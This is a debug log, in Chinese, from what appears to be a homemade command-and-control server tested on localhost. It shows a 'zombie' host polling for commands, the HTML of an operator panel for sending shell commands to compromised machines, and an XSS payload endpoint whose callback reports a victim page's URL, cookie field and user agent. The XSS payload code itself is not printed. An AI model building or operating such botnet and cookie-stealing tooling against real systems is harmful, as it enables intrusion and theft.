2025-06-24 23:30:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:30:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:30:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:30:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:30:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:30:58 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:30:58 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:30:58 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:30:58 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:30:58 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:30:58 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:30:58 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:30:58 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:30:58 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 23:31:02 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 23:31:02 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 23:31:02 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:31:02 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:31:02 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:31:02 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:31:02 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:31:02 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:31:02 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:31:02 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:31:02 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:31:02 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:31:02 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 23:31:02 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:31:02 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:31:02 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 23:31:02 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 23:31:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0224s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:31:03 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:31:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0096s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:31:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:03] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:31:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:03] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:31:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:03] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:31:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0020s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:31:07 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:31:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:31:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:07] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:31:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:31:07 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:31:07 | INFO     | control_route.py:41 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:31:07.492Z"},時間: 2025-06-24 23:31:07.512322
2025-06-24 23:31:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0138s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:31:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:07] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:31:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:31:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:31:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:31:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:31:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:31:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:31:13 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
